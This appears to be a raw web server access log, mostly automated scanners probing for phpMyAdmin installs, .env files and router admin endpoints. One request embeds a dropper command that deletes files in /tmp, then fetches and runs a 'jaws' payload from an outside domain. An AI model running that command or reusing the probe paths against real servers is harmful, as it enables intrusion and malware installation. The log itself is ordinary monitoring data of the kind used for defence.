205.210.31.31 - - [22/Jan/2023:20:23:03 -0600] "GET / HTTP/1.1" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.254.196.223 - - [22/Jan/2023:20:25:48 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:20:25:48 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
86.136.31.186 - - [22/Jan/2023:21:04:19 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 294 "-" "Hello, world"
143.110.222.166 - - [22/Jan/2023:21:08:08 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.202.169.10 - - [22/Jan/2023:21:29:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
18.237.211.247 - - [22/Jan/2023:21:30:11 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
18.237.211.247 - - [22/Jan/2023:21:30:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
205.185.118.237 - - [22/Jan/2023:21:48:46 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [22/Jan/2023:22:04:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.219 - - [22/Jan/2023:22:11:02 -0600] "GET /admin/config.php HTTP/1.1" 301 248 "-" "python-requests/2.22.0"
45.12.253.180 - - [22/Jan/2023:22:14:00 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [22/Jan/2023:22:14:03 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
143.110.222.166 - - [22/Jan/2023:23:03:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
93.119.13.153 - - [22/Jan/2023:23:06:09 -0600] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:09 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:09 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:09 -0600] "GET /phppma/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:09 -0600] "GET /sql/sql/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:10 -0600] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /phppma/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:11 -0600] "GET /mysql/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /db/webdb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:12 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:13 -0600] "GET /admin/db/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /pma/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /administrator/db/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:14 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:15 -0600] "GET /db/webdb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /admin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:16 -0600] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:17 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:17 -0600] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:17 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:17 -0600] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:17 -0600] "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:17 -0600] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /database/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:18 -0600] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /admin/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /myadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /administrator/db/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /myadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:19 -0600] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
